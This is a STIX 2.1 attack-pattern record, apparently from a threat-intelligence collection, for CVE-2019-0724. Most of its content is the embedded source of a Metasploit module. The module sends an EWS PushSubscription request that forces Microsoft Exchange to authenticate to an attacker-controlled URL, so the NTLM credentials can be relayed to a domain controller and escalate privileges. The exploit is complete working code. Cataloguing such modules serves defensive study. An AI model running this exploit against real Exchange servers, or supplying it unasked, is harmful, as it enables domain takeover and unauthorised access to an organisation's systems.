{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ed4eb1a5-4702-495f-937e-ed7bd545d9a6",
    "created": "2024-08-14T16:30:26.407115Z",
    "modified": "2024-08-14T16:30:26.407119Z",
    "name": "Microsoft Exchange Privilege Escalation Exploit",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/exchange_web_server_pushsubscription.rb",
            "external_id": "exchange_web_server_pushsubscription.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-0724"
        },
        {
            "source_name": "reference",
            "url": "https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize\n    super(\n      'Name'           => 'Microsoft Exchange Privilege Escalation Exploit',\n      'Description'    => %q{\n        This module exploits a privilege escalation vulnerability found in Microsoft Exchange - CVE-2019-0724\n        Execution of the module will force Exchange to authenticate to an arbitrary URL over HTTP via the Exchange PushSubscription feature.\n        This allows us to relay the NTLM authentication to a Domain Controller and authenticate with the privileges that Exchange is configured.\n        The module is based on the work by @_dirkjan,\n      },\n      'Author'         => [\n        '_dirkjan',         # Discovery and PoC\n        'Petros Koutroumpis' # Metasploit\n      ],\n      'References'      =>\n         [\n           [ 'CVE', '2019-0724' ],\n           [ 'URL', 'https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/' ]\n         ],\n       'DefaultOptions' =>\n        {\n          'SSL' => true,\n          'RPORT' => 443\n        },\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2019-01-21'\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, \"Username of any domain user with a mailbox on Exchange\"]),\n        OptString.new('PASSWORD', [ true, \"Password or password hash (in LM:NT format) of the user\"]),\n        OptString.new('DOMAIN', [ true, \"The Active Directory domain name\"]),\n        OptString.new('TARGETURI', [ true, \"Exchange Web Services API endpoint\", \"/EWS/Exchange.asmx\" ]),\n        OptString.new('EXCHANGE_VERSION', [ true, \"Version of Exchange (2013|2016)\", \"2016\" ]),\n        OptString.new('ATTACKER_URL', [ true, \"Attacker URL\", nil ])\n      ])\n  end\n\n  def run\n\n    domain = datastore['DOMAIN']\n    uri = datastore['TARGETURI']\n    exchange_version = datastore['EXCHANGE_VERSION']\n    attacker_url = datastore['ATTACKER_URL']\n\n    req_data = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\" + \"\\r\\n\"\n    req_data += \"<soap:Envelope xmlns:soap=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:t=\\\"http://schemas.microsoft.com/exchange/services/2006/types\\\" xmlns:m=\\\"http://schemas.microsoft.com/exchange/services/2006/messages\\\">\" + \"\\r\\n\"\n    req_data += \"<soap:Header>\" + \"\\r\\n\"\n    req_data += \"<t:RequestServerVersion Version=\\\"Exchange\"+exchange_version+\"\\\" />\" + \"\\r\\n\"\n    req_data += \"</soap:Header>\" + \"\\r\\n\"\n    req_data += \"<soap:Body>\" + \"\\r\\n\"\n    req_data += \"<m:Subscribe>\" + \"\\r\\n\"\n    req_data += \"<m:PushSubscriptionRequest SubscribeToAllFolders=\\\"true\\\">\" + \"\\r\\n\"\n    req_data += \"<t:EventTypes>\" + \"\\r\\n\"\n    req_data += \"<t:EventType>NewMailEvent</t:EventType>\" + \"\\r\\n\"\n    req_data += \"<t:EventType>ModifiedEvent</t:EventType>\" + \"\\r\\n\"\n    req_data += \"<t:EventType>MovedEvent</t:EventType>\" + \"\\r\\n\"\n    req_data += \"</t:EventTypes>\" + \"\\r\\n\"\n    req_data += \"<t:StatusFrequency>1</t:StatusFrequency>\" + \"\\r\\n\"\n    req_data += \"<t:URL>\"+attacker_url+\"</t:URL>\" + \"\\r\\n\"\n    req_data += \"</m:PushSubscriptionRequest>\" + \"\\r\\n\"\n    req_data += \"</m:Subscribe>\" + \"\\r\\n\"\n    req_data += \"</soap:Body>\" + \"\\r\\n\"\n    req_data += \"</soap:Envelope>\" + \"\\r\\n\"\n\n    http = nil\n\n    http = Rex::Proto::Http::Client.new(\n      rhost,\n      rport.to_i,\n      {},\n      ssl,\n      ssl_version,\n      proxies,\n      datastore['USERNAME'],\n      datastore['PASSWORD']\n    )\n\n    http.set_config({ 'preferred_auth' => 'NTLM' })\n    http.set_config({ 'domain' => domain })\n    add_socket(http)\n\n\n    req = http.request_raw({\n      'uri' => uri,\n      'method' => 'POST',\n      'ctype' => 'text/xml; charset=utf-8',\n      'headers' => {\n            'Accept' => 'text/xml'\n       },\n      'data' => req_data\n    })\n\n    begin\n      res = http.send_recv(req)\n      xml = res.get_xml_document\n      http.close\n    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT, ::Rex::HostUnreachable\n      print_error(\"Connection failed\")\n    rescue OpenSSL::SSL::SSLError, OpenSSL::Cipher::CipherError\n      print_error \"SSL negotiation failed\"\n    end\n\n    if res.nil?\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n\n    if res.code == 401\n      fail_with(Failure::NoAccess, 'Server returned HTTP status 401 - Authentication failed')\n    end\n\n    if xml.nil?\n      fail_with(Failure::UnexpectedReply, \"Empty reply from server\")\n    end\n\n    if res.code == 500 && xml.text.include?(\"ErrorInvalidServerVersion\")\n      fail_with(Failure::BadConfig, \"Server does not accept this Exchange dialect. Specify a different Exchange version\")\n    end\n\n    unless res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Server returned HTTP #{res.code}: #{xml.text}\")\n    end\n\n    print_good(\"Exchange returned HTTP status 200 - Authentication was successful\")\n\n    if xml.text.include? \"ErrorMissingEmailAddress\"\n      fail_with(Failure::BadConfig, \"The user does not have a mailbox associated. Try a different user.\")\n    end\n\n    unless xml.text.include? \"NoError\"\n      fail_with(Failure::Unknown, \"Unknown error. Response: #{xml.text}\")\n    end\n\n    print_good(\"API call was successful\")\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-01-21"
}